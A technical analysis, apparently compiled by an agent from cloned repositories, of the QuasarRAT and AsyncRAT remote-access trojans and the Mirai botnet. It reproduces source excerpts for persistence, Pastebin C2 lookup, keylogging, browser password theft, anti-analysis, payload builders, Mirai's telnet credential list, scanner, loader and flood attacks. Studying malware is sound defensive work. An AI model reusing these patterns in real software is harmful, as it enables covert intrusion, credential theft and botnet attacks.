# QuasarRAT, AsyncRAT, and Mirai Worm — Source Code Deep Analysis

## Overview

This document extracts actual implementation patterns from:
- **QuasarRAT** (C#/.NET) — open-source RAT
- **AsyncRAT** (C#/.NET) — open-source RAT, forked/derived from QuasarRAT
- **Mirai** (C) — IoT botnet worm

Source repos studied:
- `/root/quasar-rat-source` — github.com/quasar/Quasar
- `/root/asyncrat-source` — github.com/nyan-x-cat/AsyncRAT-C-Sharp
- `/root/mirai-source` — github.com/jgamblin/Mirai-Source-Code

---

## 1. PERSISTENCE MECHANISMS

### 1.1 QuasarRAT — Scheduled Task + Registry Run Key

File: `Quasar.Client/Setup/ClientStartup.cs`

```csharp
public void AddToStartup(string executablePath, string startupName)
{
    if (UserAccount.Type == AccountType.Admin)
    {
        ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
        {
            Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath +
                        "\" /rl HIGHEST /f",
            UseShellExecute = false,
            CreateNoWindow = true
        };

        Process p = Process.Start(startInfo);
        p.WaitForExit(1000);
        if (p.ExitCode == 0) return;
    }

    // Fallback: Registry Run key
    RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath, true);
}
```

**Pattern**: Two-tier persistence:
1. If admin: creates Scheduled Task via `schtasks /create /sc ONLOGON /rl HIGHEST`
2. If not admin (or schtasks fails): writes to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

### 1.2 QuasarRAT — Client Installation

File: `Quasar.Client/Setup/ClientInstaller.cs`

```csharp
public void Install()
{
    // Create target directory
    if (!Directory.Exists(Path.GetDirectoryName(Settings.INSTALLPATH)))
        Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLPATH));

    // Kill existing instance at install path
    if (File.Exists(Settings.INSTALLPATH))
    {
        Process[] foundProcesses =
            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Settings.INSTALLPATH));
        int myPid = Process.GetCurrentProcess().Id;
        foreach (var prc in foundProcesses)
        {
            if (prc.Id == myPid) continue;
            if (prc.GetMainModuleFileName() != Settings.INSTALLPATH) continue;
            prc.Kill();
            Thread.Sleep(2000);
            break;
        }
    }

    File.Copy(Application.ExecutablePath, Settings.INSTALLPATH, true);
    ApplySettings();  // hides file/directory, adds to startup

    // Delete Zone.Identifier (removes "mark of the web")
    FileHelper.DeleteZoneIdentifier(Settings.INSTALLPATH);

    // Launch installed copy
    Process.Start(new ProcessStartInfo
    {
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        UseShellExecute = false,
        FileName = Settings.INSTALLPATH
    });
}
```

**Key techniques**:
- Copies itself to `%APPDATA%` (or ProgramFiles, System32)
- Kills running old instance at target path before overwriting
- Removes Zone.Identifier ADS (mark of the web)
- Sets hidden file + hidden directory attributes
- Launches new instance from installed location

### 1.3 AsyncRAT — Registry Run + Mutex

AsyncRAT uses identical Registry Run key persistence and a mutex for single-instance:

```csharp
// Mutex check
public static string MTX = "%MTX%";  // set at build time
// Used to prevent multiple instances
```

### 1.4 Mirai — Self-Protection Killer

File: `mirai/bot/killer.c`

Mirai's persistence is unique: instead of adding itself to startup, it kills competing malware and binds to service ports to prevent other processes from using them:

```c
// Kill telnet service and prevent it from restarting
if (killer_kill_by_port(htons(23))) { ... }
tmp_bind_addr.sin_port = htons(23);
if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
{
    bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
    listen(tmp_bind_fd, 1);
}

// Same for SSH (22) and HTTP (80)
```

**Killer walks `/proc` to find and kill competing malware**:
```c
while ((file = readdir(dir)) != NULL)
{
    // skip non-PID folders
    if (*(file->d_name) < '0' || *(file->d_name) > '9') continue;

    // Resolve /proc/$pid/exe -> realpath
    readlink(exe_path, realpath, sizeof(realpath) - 1);

    // Kill if path contains ".anime"
    if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
    {
        unlink(realpath);
        kill(pid, 9);
    }

    // Kill if binary has been deleted (still running)
    if ((fd = open(realpath, O_RDONLY)) == -1)
        kill(pid, 9);

    // Memory scan for known bot strings (qbot, zollard, upx, remaiten)
    if (memory_scan_match(exe_path))
        kill(pid, 9);
}
```

---

## 2. C2 COMMUNICATIONS & CRYPTO

### 2.1 QuasarRAT — TLS + AES-256-CBC-HMAC

**Transport**: TLS 1.2 with pinned server certificate — client validates server identity by comparing the received certificate with an embedded certificate:

File: `Quasar.Client/Networking/Client.cs`

```csharp
protected void Connect(IPAddress ip, ushort port)
{
    handle = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
    handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
    handle.Connect(ip, port);

    _stream = new SslStream(new NetworkStream(handle, true), false, ValidateServerCertificate);
    _stream.AuthenticateAsClient(ip.ToString(), null, SslProtocols.Tls12, false);
}

private bool ValidateServerCertificate(object sender, X509Certificate certificate,
    X509Chain chain, SslPolicyErrors sslPolicyErrors)
{
    // Certificate pinning — no PKI trust chain, direct comparison
    return _serverCertificate.Equals(certificate);
}
```

**Application-layer encryption**: AES-256-CBC + HMAC-SHA256 (Encrypt-then-MAC):

File: `Quasar.Common/Cryptography/Aes256.cs`

```
FORMAT: [ HMAC-SHA256 (32B) | IV (16B) | AES-256-CBC CIPHERTEXT ]

Key derivation: PBKDF2 (RFC 2898) with 50,000 iterations
  masterKey = server cert thumbprint (SHA-1)
  salt = hardcoded 32-byte array
  -> 32B AES key + 64B auth key
```

```csharp
public Aes256(string masterKey)
{
    using (Rfc2898DeriveBytes derive = new Rfc2898DeriveBytes(masterKey, Salt, 50000))
    {
        _key = derive.GetBytes(32);      // AES-256 key
        _authKey = derive.GetBytes(64);  // HMAC-SHA256 key
    }
}

public byte[] Encrypt(byte[] input)
{
    // 1. Skip 32 bytes for HMAC
    // 2. Generate random IV, write it
    // 3. AES-256-CBC encrypt
    // 4. Compute HMAC-SHA256(IV || ciphertext)
    // 5. Write HMAC at position 0
}

public byte[] Decrypt(byte[] input)
{
    // 1. Read first 32 bytes = HMAC
    // 2. Compute HMAC of remaining data
    // 3. Constant-time comparison
    // 4. Read 16B IV
    // 5. AES-256-CBC decrypt
}
```

**Session initialization**: On connect, client sends a `ClientIdentification` message containing HWID, username, OS, geo-IP, tag, encryption key, and a server signature. The server must acknowledge before any commands are processed.

### 2.2 AsyncRAT — TLS + AES-256-CBC-HMAC (Identical Crypto)

AsyncRAT uses the **exact same** AES-256 scheme as QuasarRAT (same salt, same PBKDF2, same HMAC-SHA256, same wire format). The Aes256 class is byte-for-byte identical.

Key differences:
- **Random key per build**: AsyncRAT generates a random 32-char key at build time (not cert thumbprint)
- **Key stored Base64-encoded**: `Settings.Key = Convert.ToBase64String(Encoding.UTF8.GetBytes(key))`
- **TLS**: Same certificate pinning pattern, validates `Settings.ServerCertificate.Equals(certificate)`
- **Connection**: Supports DNS resolution with multi-IP fallback and Pastebin C2 retrieval

File: `AsyncRAT-C#/Client/Connection/ClientSocket.cs`

```csharp
// Dynamic C2 via Pastebin
if (Settings.Pastebin != "null")
{
    using (WebClient wc = new WebClient())
    {
        string resp = wc.DownloadString(Settings.Pastebin);
        string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
        Settings.Hosts = spl[0];
        Settings.Ports = spl[new Random().Next(1, spl.Length)];
    }
}

// DNS resolution with multi-IP fallback
if (IsValidDomainName(ServerIP))
{
    IPAddress[] addresslist = Dns.GetHostAddresses(ServerIP);
    foreach (IPAddress theaddress in addresslist)
    {
        TcpClient.Connect(theaddress, ServerPort);
        if (TcpClient.Connected) break;
    }
}
```

### 2.3 QuasarRAT/AsyncRAT — Message Serialization

File: `Quasar.Common/Networking/PayloadWriter.cs`

```
Wire format: [ 4-byte length (LE) | protobuf-serialized message ]
```

```csharp
public int WriteMessage(IMessage message)
{
    using (MemoryStream ms = new MemoryStream())
    {
        Serializer.Serialize(ms, message);  // Protobuf-net
        byte[] payload = ms.ToArray();
        WriteInteger(payload.Length);  // 4-byte length prefix
        WriteBytes(payload);
        return sizeof(int) + payload.Length;
    }
}
```

AsyncRAT uses **MsgPack** instead of Protobuf for serialization, but the same length-prefix framing over TLS.

### 2.4 Mirai — Plain TCP + XOR Obfuscation

Mirai CNC communication is **plain TCP, no encryption**. Strings are XOR-obfuscated in memory but transmitted in clear text.

File: `mirai/bot/table.c`

```c
uint32_t table_key = 0xdeadbeef;

static void toggle_obf(uint8_t id)
{
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;  // XOR with all 4 key bytes
    }
}
```

Strings are stored XOR-obfuscated with `0xdeadbeef` and unlocked/locked via `table_unlock_val()` / `table_lock_val()` before/after each use to evade static analysis. The XOR is a simple byte-wise toggle — XOR twice restores the original.

**CNC protocol** (from `mirai/bot/main.c`):

```
Bot sends:  \x00\x00\x00\x01 + id_len (1B) + id_buf (optional)
CNC sends:  len (2B, network order) + payload (attack command)
Keep-alive: bot sends 2-byte zero every ~60 seconds
```

Attack command parsing (`mirai/bot/attack.c`):
```
[ duration (4B, NBO) | attack_id (1B) | num_targets (1B) | targets | num_opts (1B) | opts ]
```

Supported attack vectors: UDP (generic/VSE/DNS/plain), TCP (SYN/ACK/STOMP), GRE (IP/Ethernet), HTTP (Layer 7)

---

## 3. PROCESS INJECTION

### 3.1 QuasarRAT — No Process Injection

QuasarRAT does **not** implement process injection. It runs as a standalone process and uses standard .NET APIs for all operations. The closest it gets is:
- Reverse proxy functionality (relaying TCP connections)
- Killing old instances at install path

### 3.2 AsyncRAT — No Native Process Injection, But Has XMRig Miner Injection

AsyncRAT bundles an **XMRig cryptocurrency miner** (`xmrig.bin` in Resources) that can be dropped and executed:

File: `AsyncRAT-C#/Server/Handle Packet/HandleMiner.cs`

The miner is injected by:
1. Extracting `xmrig.bin` from resources
2. Writing it to a temp path
3. Executing with pool/wallet/password from builder config

There's also a `Server/RenamingObfuscation/Classes/InjectHelper.cs` which is a **dnlib-based .NET assembly injector** — it can clone types, methods, and fields from one .NET module into another. This is used by the builder for obfuscation (not runtime injection), but the framework exists.

### 3.3 Mirai — No Process Injection

Mirai uses `fork()` to create child processes for scanning and killing. It does not inject code into other processes. Its "evasion" is:
- Self-deletion: `unlink(args[0])`
- Process name randomization: `prctl(PR_SET_NAME, random_name)`
- argv[0] randomization
- Anti-GDB: `signal(SIGTRAP, &anti_gdb_entry)` — if a debugger is attached, SIGTRAP will be caught by the debugger before the handler runs, preventing CNC resolution

---

## 4. CREDENTIAL THEFT

### 4.1 QuasarRAT — Multi-Browser Password Stealer

File: `Quasar.Client/Recovery/Browsers/ChromePassReader.cs`

Quasar reads saved passwords from browser SQLite databases. It supports:
- **Chrome** — `%LocalAppData%\Google\Chrome\User Data\Default\Login Data`
- **Brave, Opera, OperaGX, Edge, Yandex** — same Chromium-based pattern
- **Firefox** — separate reader for Firefox profile
- **Internet Explorer** — separate reader
- **FileZilla, WinSCP** — FTP client credential recovery

The Chromium-based readers extend `ChromiumBase` which:
1. Reads the encrypted `Login Data` SQLite database
2. Extracts the AES key from `Local State` (DPAPI-protected)
3. Uses `CryptUnprotectData` to decrypt the master key
4. Decrypts stored passwords

### 4.2 AsyncRAT — Same Credential Recovery

AsyncRAT uses a nearly identical password recovery module (`HandleRecovery.cs` / server-side handler).

---

## 5. KEYLOGGING

### 5.1 QuasarRAT — Global Hook-Based Keylogger

File: `Quasar.Client/Logging/Keylogger.cs`

Uses `Gma.System.MouseKeyHook` (global Windows hooks) to capture keystrokes:

```csharp
private readonly IKeyboardMouseEvents _mEvents;

public Keylogger(double flushInterval, long maxLogFileSize)
{
    _mEvents = Hook.GlobalEvents();  // SetWindowsHookEx internally
}

private void Subscribe()
{
    _mEvents.KeyDown += OnKeyDown;
    _mEvents.KeyUp += OnKeyUp;
    _mEvents.KeyPress += OnKeyPress;
}
```

**Output format**: HTML with colored special keys
```html
<p class="h"><br><br>[<b>Window Title - 14:30 UTC</b>]</p><br>
typed text<p class="h">[Enter]</p><br>
<p class="h">[Ctrl + C]</p>
```

**Storage**: Logs written to disk, encrypted with the same AES-256 key, flushed periodically via timer. Files stored in configurable log directory (hidden if configured).

### 5.2 AsyncRAT — Similar Keylogger

AsyncRAT has an equivalent keylogger module, storing keystrokes and sending them to the server on-demand.

---

## 6. REMOTE DESKTOP / SCREEN CAPTURE

### 6.1 QuasarRAT — UnsafeStreamCodec Screen Capture

File: `Quasar.Client/Messages/RemoteDesktopHandler.cs`

```csharp
private void Execute(ISender client, GetDesktop message)
{
    Bitmap desktop = ScreenHelper.CaptureScreen(message.DisplayIndex);
    desktopData = desktop.LockBits(...);

    _streamCodec.CodeImage(desktopData.Scan0, ...);
    // Sends JPEG-compressed frame via protobuf message
    client.Send(new GetDesktopResponse { Image = stream.ToArray(), ... });
}
```

Also supports:
- **Mouse input forwarding** (left/right click, move, scroll)
- **Keyboard input forwarding** (key down/up events)
- **Multi-monitor** support
- **Screensaver detection and disable** before input simulation

---

## 7. BUILDER — HOW PAYLOADS ARE GENERATED

### 7.1 QuasarRAT Builder

File: `Quasar.Server/Build/ClientBuilder.cs`

The builder modifies a pre-compiled stub (`Quasar.Client.exe`) using **Mono.Cecil**:

```csharp
public void Build()
{
    using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
    {
        // PHASE 1: Write settings by modifying IL in Settings..cctor
        WriteSettings(asmDef);

        // PHASE 2: Rename types/methods (obfuscation)
        Renamer r = new Renamer(asmDef);
        r.Perform();

        // PHASE 3: Write modified assembly
        r.AsmDef.Write(_options.OutputPath);
    }

    // PHASE 4: Change assembly metadata (version info)
    // PHASE 5: Change icon
}
```

**WriteSettings** directly modifies the IL instructions in the static constructor of `Quasar.Client.Config.Settings`:
- All strings (host, port, install path, etc.) are **AES-encrypted** at rest
- Bool values (install, startup, keylogger enabled) are patched to `Ldc_I4_0` or `Ldc_I4_1`
- Connection delay is patched as `Ldc_I4` integer
- The AES encryption key = server certificate **thumbprint**

```csharp
// Builder generates encryption key
var key = serverCertificate.Thumbprint;  // SHA-1 hash of server cert
var aes = new Aes256(key);

// Builder encrypts all settings into the IL
methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.RawHosts);  // C2 address
methodDef.Body.Instructions[i].Operand = aes.Encrypt(_options.Mutex);      // Mutex name
methodDef.Body.Instructions[i].Operand = key;  // Encryption key (plain: cert thumbprint)
methodDef.Body.Instructions[i].Operand = aes.Encrypt(signature);  // Server RSA signature
```

### 7.2 AsyncRAT Builder

File: `AsyncRAT-C#/Server/Forms/FormBuilder.cs`

AsyncRAT builder is nearly identical but uses **dnlib** instead of **Mono.Cecil**:

```csharp
private void WriteSettings(ModuleDefMD asmDef, string AsmName)
{
    var key = Methods.GetRandomString(32);  // Random 32-char key
    var aes = new Aes256(key);
    var caCertificate = new X509Certificate2(Settings.CertificatePath, ...);
    var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert));

    // Sign key with server's RSA private key
    using (var csp = (RSACryptoServiceProvider)caCertificate.PrivateKey)
    {
        var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
        signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
    }

    // Patch IL strings
    foreach (TypeDef type in asmDef.Types)
    {
        if (type.Name == "Settings")
            foreach (MethodDef method in type.Methods)
            {
                // Replace %Hosts% with AES-encrypted host list
                if (method.Body.Instructions[i].Operand.ToString() == "%Hosts%")
                    method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));

                // Replace %Key% with Base64(random key)
                if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
                    method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));
            }
    }
}
```

**Differences from QuasarRAT**:
- Uses random 32-char string as AES key (not cert thumbprint)
- Stores key Base64-encoded in the binary
- Signature verification: client verifies `RSA.VerifyHash(SHA256(key), signature)` to confirm it's connecting to the legitimate server
- **Pastebin C2**: Can use a Pastebin URL to dynamically fetch C2 address
- **Obfuscation**: Includes Classes/Methods/Fields/Properties/Namespaces renaming + string encryption
- **Assembly cloning**: Copies version info from a legitimate EXE to spoof file properties

---

## 8. EVASION TECHNIQUES

### 8.1 QuasarRAT Evasion
- **No anti-VM/anti-debug** in the open-source version
- Hidden files/directories (`FileAttributes.Hidden`)
- Zone.Identifier deletion (removes "mark of the web")
- Name obfuscation via builder (type/method renaming)
- Assembly metadata spoofing

### 8.2 AsyncRAT Anti-Analysis

File: `AsyncRAT-C#/Client/Helper/Anti_Analysis.cs`

```csharp
public static void RunAntiAnalysis()
{
    if (DetectManufacturer() ||  // VMware, VirtualBox, Microsoft Virtual
        DetectDebugger() ||       // CheckRemoteDebuggerPresent
        DetectSandboxie() ||      // SbieDll.dll module check
        IsSmallDisk() ||          // Disk < 60GB
        IsXP())                   // Windows XP
        Environment.FailFast(null);  // Instant process termination
}
```

```csharp
private static bool DetectManufacturer()
{
    using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
    {
        foreach (var item in searcher.Get())
        {
            string manufacturer = item["Manufacturer"].ToString().ToLower();
            if ((manufacturer == "microsoft corporation" &&
                 item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                || manufacturer.Contains("vmware")
                || item["Model"].ToString() == "VirtualBox")
            {
                return true;
            }
        }
    }
}
```

### 8.3 AsyncRAT Obfuscation

The builder can apply **symbol renaming** via `Server/RenamingObfuscation/`:
- **ClassesRenaming**: Renames all types to random strings
- **MethodsRenaming**: Renames all methods
- **FieldsRenaming**: Renames all fields
- **PropertiesRenaming**: Renames all properties
- **NamespacesRenaming**: Renames all namespaces
- **EncryptString**: (commented out in the open-source version — would encrypt string literals)

### 8.4 Mirai Evasion
- **Self-deletion**: `unlink(args[0])` immediately after execution
- **Process name hiding**: `prctl(PR_SET_NAME, random_alpha_string)`
- **argv[0] overwrite** with random data
- **Fork + setsid** to become daemon
- **Signal-based anti-GDB**: Sets SIGTRAP handler; if GDB catches the signal first, CNC address is never resolved
- **Watchdog disable**: Opens `/dev/watchdog` and disables it with ioctl magic
- **String obfuscation**: All strings XOR'd with `0xdeadbeef` — only decrypted momentarily when accessed

---

## 9. MIRAI WORM — SELF-REPLICATION & PROPAGATION

### 9.1 Scanner Architecture

Mirai's scanner is a **SYN-scanner** using raw sockets + telnet brute-force:

```c
void scanner_init(void)
{
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;  // Parent returns

    // Raw socket for SYN scanning
    rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i));

    // Pre-built SYN packet
    iph->protocol = IPPROTO_TCP;
    tcph->dest = htons(23);  // Telnet
    tcph->syn = TRUE;
}
```

**Scanner loop**:
1. Spew SYN packets to random IPs (ports 23 and 2323)
2. Read SYN+ACK responses from raw socket
3. For each responsive IP, attempt telnet login with 60+ credential pairs (root:xc3511, admin:admin, root:, etc.)
4. On successful login, send `/bin/busybox MIRAI` or equivalent
5. Report working credentials to the loader server

### 9.2 Scanner Credential Brute-Force

File: `mirai/bot/scanner.c` (60+ IoT default credentials):

```c
add_auth_entry("root",     "xc3511",     10);  // DVR
add_auth_entry("root",     "vizxv",       9);  // Camera
add_auth_entry("root",     "admin",       8);  // Generic
add_auth_entry("admin",    "admin",       7);
add_auth_entry("root",     "888888",      6);
add_auth_entry("root",     "xmhdipc",     5);
add_auth_entry("root",     "default",     5);
add_auth_entry("root",     "juantech",    5);
add_auth_entry("root",     "123456",      5);
add_auth_entry("root",     "54321",       5);
add_auth_entry("support",  "support",     5);
add_auth_entry("root",     "",            4);   // No password
add_auth_entry("admin",    "password",    4);
// ... 60+ more entries
```

Weighted random selection for credential selection (more common credentials tried more frequently).

### 9.3 Telnet Brute-Force State Machine

```
SC_CONNECTING -> SC_HANDLE_IACS -> SC_WAITING_USERNAME -> SC_WAITING_PASSWORD
    -> SC_WAITING_PASSWD_RESP -> SC_WAITING_ENABLE_RESP -> SC_WAITING_SYSTEM_RESP
    -> SC_WAITING_SHELL_RESP -> SC_WAITING_SH_RESP -> SC_WAITING_TOKEN_RESP
```

At each state, the scanner:
1. Consumes telnet IAC negotiation bytes
2. Waits for login/busybox/shell prompts
3. Sends username, then password, then enable/system/shell/sh commands
4. Finally runs a query command (`/bin/busybox MIRAI`) and checks response for the architecture token

### 9.4 Loader Architecture

File: `mirai/loader/src/main.c`

The loader receives `ip:port user:pass arch` lines from the scanner and:
1. Connects to the compromised device via telnet
2. Uses busybox `wget` or `tftp` to download the Mirai binary
3. Executes it

```c
// Loader reads from stdin (fed by scanner callback server)
while (TRUE)
{
    fgets(strbuf, sizeof(strbuf), stdin);
    telnet_info_parse(strbuf, &info);
    server_queue_telnet(srv, &info);
}
```

### 9.5 CNC Bot

File: `mirai/bot/main.c`

```c
int main(int argc, char **args)
{
    // Delete self
    unlink(args[0]);

    // Signal-based anti-debug
    signal(SIGTRAP, &anti_gdb_entry);

    // Watchdog disable
    ioctl(wfd, 0x80045704, &one);

    // Daemonize
    fork();
    setsid();

    // Initialize attack, killer, scanner modules
    attack_init();
    killer_init();
    scanner_init();

    // Main loop: select() on CNC socket + control socket
    while (TRUE)
    {
        select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);

        // Handle CNC commands (attack_parse)
        // Handle kill signal from new instance (single-instance enforcement)
        // Keep-alive pings every ~60 seconds
    }
}
```

### 9.6 Mirai DDoS Attack Vectors

File: `mirai/bot/attack.c`

```c
add_attack(ATK_VEC_UDP,      attack_udp_generic);   // UDP flood
add_attack(ATK_VEC_VSE,      attack_udp_vse);       // Valve Source Engine query flood
add_attack(ATK_VEC_DNS,      attack_udp_dns);       // DNS amplification
add_attack(ATK_VEC_UDP_PLAIN, attack_udp_plain);    // Plain UDP
add_attack(ATK_VEC_SYN,      attack_tcp_syn);       // TCP SYN flood
add_attack(ATK_VEC_ACK,      attack_tcp_ack);       // TCP ACK flood
add_attack(ATK_VEC_STOMP,    attack_tcp_stomp);     // TCP STOMP (SYN+PUSH+ACK)
add_attack(ATK_VEC_GREIP,    attack_gre_ip);        // GRE IP flood
add_attack(ATK_VEC_GREETH,   attack_gre_eth);       // GRE Ethernet flood
add_attack(ATK_VEC_HTTP,     attack_app_http);      // HTTP layer 7 flood
```

Each attack forks a child process, builds raw packets, and floods in a tight loop with `sendto()`.

---

## 10. COMPARATIVE SUMMARY

| Feature | QuasarRAT | AsyncRAT | Mirai |
|---------|-----------|----------|-------|
| **Language** | C# | C# | C |
| **Transport** | TLS 1.2 | TLS 1.2 | Plain TCP |
| **App Crypto** | AES-256-CBC + HMAC-SHA256 | AES-256-CBC + HMAC-SHA256 | XOR (0xdeadbeef) |
| **Key Source** | Server cert thumbprint | Random 32-char per build | Hardcoded constant |
| **Serialization** | Protobuf-net | MsgPack | Custom binary |
| **Persistence** | Schtasks + Registry Run | Registry Run + Mutex | Port binding + killer |
| **Anti-VM** | None | VMware/VBox/Sandboxie/Disk/Debug | Anti-GDB via SIGTRAP |
| **Obfuscation** | Cecil-based renaming | dnlib renaming + string encrypt | XOR string table |
| **Credential Theft** | Chromium + Firefox + IE + FTP | Same | None |
| **Keylogger** | Global hook, HTML output | Global hook | None |
| **RDP** | Full screen capture + input | Full screen capture + input | None |
| **Builder** | Mono.Cecil IL patching | dnlib IL patching + Pastebin | Hardcoded config |
| **Self-spread** | None | None | Telnet brute-force + loader |
| **DDoS** | None | None | 10 attack vectors |
| **Kill competing** | None | None | /proc scanner + port killer |
| **XMRig miner** | No | Yes (optional) | No |

---

## 11. KEY ARCHITECTURAL INSIGHTS

### QuasarRAT
1. **Clean modular architecture** — Client, Server, Common libraries
2. **Message-based command dispatch** — polymorphic protobuf messages with `MessageHandler.Process()`
3. **SSL pinning done right** — no PKI dependency, direct cert comparison
4. **Settings baked at compile time via IL patching** — no external config files
5. **Two-tier persistence** — tries scheduled task first, falls back to registry

### AsyncRAT
1. **Direct descendant of QuasarRAT** — same crypto, same architecture, same message handler pattern
2. **Added evasion capabilities** — anti-VM, anti-sandbox, anti-debug, small disk detection
3. **Dynamic C2** — Pastebin URL for C2 address updates without rebuild
4. **Random per-build encryption key** — better opsec than cert-thumbprint-as-key
5. **Bundled XMRig miner** — dual-purpose: espionage + cryptomining
6. **More comprehensive obfuscation** — classes, methods, fields, properties, namespaces all renamed

### Mirai
1. **Pure C, minimal dependencies** — statically linked for embedded Linux
2. **Fork-based concurrency** — scanner, killer, each attack all in separate processes
3. **Raw socket SYN scan** — bypasses OS TCP stack for speed
4. **Telnet brute-force** — 60+ IoT default credentials, weighted by prevalence
5. **XOR string obfuscation** — simple but effective against static analysis
6. **Anti-competitive behavior** — kills other malware, binds service ports
7. **Signal-based anti-debug** — clever use of SIGTRAP to detect GDB
8. **Self-deletion + daemonization** — removes evidence from filesystem

---

## Files Created

- `/root/killer-queen-knowledge/rat-source-analysis.md` — This document

## Repositories Cloned

- `/root/quasar-rat-source` — QuasarRAT source (github.com/quasar/Quasar)
- `/root/asyncrat-source` — AsyncRAT source (github.com/nyan-x-cat/AsyncRAT-C-Sharp)
- `/root/mirai-source` — Mirai source (github.com/jgamblin/Mirai-Source-Code)
